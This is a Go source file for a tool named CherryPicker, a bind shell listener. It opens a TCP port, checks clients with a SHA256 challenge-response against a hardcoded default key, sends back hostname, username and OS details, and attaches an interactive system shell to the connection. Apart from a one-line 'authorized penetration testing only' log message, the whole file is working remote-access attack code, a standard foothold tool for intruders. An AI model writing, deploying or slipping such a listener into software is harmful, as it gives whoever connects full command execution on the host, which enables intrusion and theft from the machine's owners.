package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const targetBanner = `
  ____ _                          ____  _      _             
 / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
 \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
                            |___/                             
[TARGET MODULE] - Bind shell listener
Version: 2.0.0
`

var authKey string

func main() {
	port := flag.Int("port", 9999, "Port to listen on")
	key := flag.String("key", "CHERRY_PICKER_2025", "Authentication key")
	flag.Parse()

	authKey = *key

	fmt.Println(targetBanner)
	log.Println("[!] For authorized penetration testing only!")
	log.Printf("[*] Listening on port %d\n", *port)
	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))

	// Start listener
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatalf("[!] Failed to start listener: %v\n", err)
	}
	defer listener.Close()

	// Setup signal handler for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Accept connections in goroutine
	connChan := make(chan net.Conn)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("[!] Accept error: %v\n", err)
				continue
			}
			connChan <- conn
		}
	}()

	log.Println("[*] Waiting for connections...")

	// Main loop
	for {
		select {
		case <-sigChan:
			log.Println("\n[*] Interrupt received, shutting down...")
			return
		case conn := <-connChan:
			log.Printf("[+] Connection from %s\n", conn.RemoteAddr())
			go handleConnection(conn)
		}
	}
}

// handleConnection manages a client connection
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Perform authentication
	if err := authenticate(conn); err != nil {
		log.Printf("[!] Authentication failed from %s: %v\n", conn.RemoteAddr(), err)
		conn.Write([]byte("AUTH_FAILED\n"))
		return
	}

	log.Printf("[+] Authentication successful from %s\n", conn.RemoteAddr())
	conn.Write([]byte("AUTH_OK\n"))

	// Send banner
	sendBanner(conn)

	// Spawn shell
	log.Printf("[+] Spawning shell for %s\n", conn.RemoteAddr())
	if err := spawnShell(conn); err != nil {
		log.Printf("[!] Shell error: %v\n", err)
	}

	log.Printf("[*] Connection closed from %s\n", conn.RemoteAddr())
}

// authenticate performs challenge-response authentication
func authenticate(conn net.Conn) error {
	// Set authentication timeout
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{})

	// Generate random challenge
	challengeBytes := make([]byte, 16)
	if _, err := rand.Read(challengeBytes); err != nil {
		return fmt.Errorf("failed to generate challenge: %w", err)
	}
	challenge := hex.EncodeToString(challengeBytes)

	// Send challenge
	_, err := conn.Write([]byte("CHALLENGE:" + challenge + "\n"))
	if err != nil {
		return fmt.Errorf("failed to send challenge: %w", err)
	}

	// Read response
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read response: %w", err)
	}

	response := strings.TrimSpace(string(buf[:n]))
	if !strings.HasPrefix(response, "RESPONSE:") {
		return fmt.Errorf("invalid response format")
	}

	receivedResponse := strings.TrimPrefix(response, "RESPONSE:")

	// Compute expected response: SHA256(challenge + key)
	expectedHash := sha256.Sum256([]byte(challenge + authKey))
	expectedResponse := hex.EncodeToString(expectedHash[:])

	// Compare
	if receivedResponse != expectedResponse {
		return fmt.Errorf("invalid credentials")
	}

	return nil
}

// sendBanner sends system information banner
func sendBanner(conn net.Conn) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}

	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",
		hostname, username, runtime.GOOS, runtime.GOARCH)

	conn.Write([]byte(banner))
}

// spawnShell spawns an interactive shell
func spawnShell(conn net.Conn) error {
	// Get appropriate shell
	shell, shellArgs := getShell()

	// Create command
	cmd := exec.Command(shell, shellArgs...)

	// Connect stdio to connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	// Wait for completion
	return cmd.Wait()
}

// getShell returns the appropriate shell based on OS
func getShell() (string, []string) {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe", []string{}
	case "linux", "darwin":
		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = "/bin/sh"
		}
		return shell, []string{"-i"}
	default:
		return "/bin/sh", []string{"-i"}
	}
}
